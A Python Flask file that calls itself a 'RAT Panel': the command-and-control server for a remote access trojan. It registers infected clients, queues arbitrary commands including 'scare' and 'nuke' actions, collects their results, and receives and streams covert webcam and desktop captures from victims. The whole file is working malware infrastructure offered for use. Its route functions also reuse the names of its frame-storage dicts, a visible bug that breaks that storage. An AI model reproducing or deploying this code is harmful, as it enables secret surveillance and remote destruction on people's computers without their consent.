from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import time

app = Flask(__name__)
CORS(app)

clients = {}
pending_commands = {}
scare_active = {}
stream_webcam = {}
stream_desktop = {}

@app.route('/')
def index():
    return "<h1>RAT Panel Active</h1>"

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    client_id = data.get('client_id')
    if client_id:
        clients[client_id] = {
            'hostname': data.get('hostname'),
            'pid': data.get('pid'),
            'last_seen': time.time(),
            'status': 'online'
        }
        if client_id not in scare_active:
            scare_active[client_id] = False
    return jsonify({'status': 'ok'})

@app.route('/api/clients')
def get_clients():
    for cid in list(clients.keys()):
        if time.time() - clients[cid]['last_seen'] > 60:
            del clients[cid]
    return jsonify(clients)

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client')
    command = data.get('command')
    
    if command == "scare_start":
        scare_active[client_id] = True
        pending_commands[client_id] = "scare_start"
    elif command == "scare_stop":
        scare_active[client_id] = False
        pending_commands[client_id] = "scare_stop"
    elif command == "nuke":
        if scare_active.get(client_id, False):
            pending_commands[client_id] = "nuke"
            return jsonify({'status': 'nuke_sent'})
        else:
            return jsonify({'status': 'nuke_blocked', 'reason': 'scare_not_active'})
    else:
        pending_commands[client_id] = command
    
    return jsonify({'status': 'queued'})

@app.route('/api/poll/<client_id>')
def poll(client_id):
    return jsonify({'command': pending_commands.pop(client_id, None)})

@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    print(f"[{data.get('client')}] {data.get('result')}")
    return jsonify({'status': 'ok'})

@app.route('/api/stream/webcam/<client_id>', methods=['POST'])
def stream_webcam(client_id):
    data = request.json
    stream_webcam[client_id] = data.get('frame')
    return jsonify({'status': 'ok'})

@app.route('/api/stream/desktop/<client_id>', methods=['POST'])
def stream_desktop(client_id):
    data = request.json
    stream_desktop[client_id] = data.get('frame')
    return jsonify({'status': 'ok'})

@app.route('/api/view/webcam/<client_id>')
def view_webcam(client_id):
    def generate():
        while True:
            frame = stream_webcam.get(client_id)
            if frame:
                yield f"data:image/jpeg;base64,{frame}\n\n"
            time.sleep(0.1)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/api/view/desktop/<client_id>')
def view_desktop(client_id):
    def generate():
        while True:
            frame = stream_desktop.get(client_id)
            if frame:
                yield f"data:image/jpeg;base64,{frame}\n\n"
            time.sleep(0.1)
    return Response(generate(), mimetype='text/event-stream')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)